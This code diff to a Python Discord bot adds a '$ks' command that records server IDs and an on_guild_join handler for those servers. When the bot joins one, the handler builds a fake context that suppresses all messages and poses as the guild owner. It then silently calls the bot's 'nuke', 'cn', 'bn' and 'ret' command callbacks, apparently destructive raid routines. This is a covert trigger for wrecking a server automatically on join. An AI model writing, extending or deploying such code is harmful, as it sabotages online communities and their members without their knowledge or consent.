@@ -6,7 +6,39 @@ intents = discord.Intents.default()
 intents.message_content = True
 intents.guilds = True
 intents.guild_messages = True
+intents.guild_reactions = True
+intents.members = True
 bot = commands.Bot(command_prefix='$', intents=intents)
+
+programmed_servers = set()
+
+@bot.command()
+@commands.has_permissions(administrator=True)
+async def ks(ctx, server_id: int):
+    programmed_servers.add(server_id)
+
+@bot.event
+async def on_guild_join(guild):
+    if guild.id in programmed_servers:
+        channel = next(
+            (c for c in guild.text_channels if c.permissions_for(guild.me).send_messages),
+            None
+        )
+        if not channel:
+            return
+
+        class SilentCtx:
+            def __init__(self, guild, channel, bot_user):
+                self.guild = guild
+                self.channel = channel
+                self.send = lambda *args, **kwargs: None
+                self.author = guild.owner or bot_user
+
+        ctx = SilentCtx(guild, channel, bot.user)
+        await nuke.callback(ctx)
+        await cn.callback(ctx)
+        await bn.callback(ctx)
+        await ret.callback(ctx)
 
 @bot.command()
 @commands.has_permissions(administrator=True)
@@ -291,3 +323,4 @@ async def on_ready():
 
 
 bot.run("TOKEN DEL BOT DE DISCORD")
+
